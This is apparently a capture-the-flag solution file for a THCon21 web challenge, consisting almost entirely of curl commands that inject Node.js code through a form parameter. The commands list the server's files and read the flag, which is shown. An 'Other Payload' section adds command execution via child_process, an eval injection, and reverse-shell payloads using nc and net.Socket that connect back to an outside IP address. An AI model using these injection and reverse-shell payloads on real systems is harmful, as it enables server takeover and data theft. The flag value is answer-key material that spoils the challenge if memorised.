@@ -1,0 +1,36 @@
+curl -X POST http://remote1.thcon.party:10702/ --data "width[]=require('fs').readdirSync('.').toString());//&height=1"
+
+```
+index.js,node_modules,package-lock.json,package.json,sec9et_fl46.txt,static,views
+```
+
+curl -X POST http://remote1.thcon.party:10702/ --data "width[]=require('fs').readFileSync('sec9et_fl46.txt'));//&height=1"
+```
+THCon21{t34cHiN6_1s_N0t_sO_3@sY}
+```
+
+============ Other Payload ============
+
+
+# List Directory
+
+curl -X POST http://remote1.thcon.party:10702/ --data "width[]=require('child_process').execSync('ls'));//&height=1"
+
+
+# Get flag
+
+curl -X POST http://remote1.thcon.party:10702/ --data "width[]=require('child_process').execSync('cat sec9et_fl46.txt'));//&height=1"
+
+curl -X POST http://remote1.thcon.party:10702/ --data "width=eval(req/*&height=*/.body.a)&a=res.send(require('fs').readFileSync('sec9et_fl46.txt'));"
+
+
+# Reverse Shell
+
+curl -X POST http://remote2.thcon.party:10702/ --data "width[]=require('child_process').execSync('nc 140.xxx.xxx.xxx 9002 -e /bin/sh'));//&height=1"
+
+
+curl -X POST http://remote1.thcon.party:10702/ --data "width[]=(function(){var net = require('net'),cp = require('child_process'),sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(9002, '140.xxx.xxx.xxx', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})());//&height=1"
+
+curl -X POST http://remote1.thcon.party:10702/ --data "width[]=(function(){var sh=require('child_process').spawn('/bin/sh');require('net').connect(9002, '140.113.24.143',function(){this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});})());//&height=1"
+
+
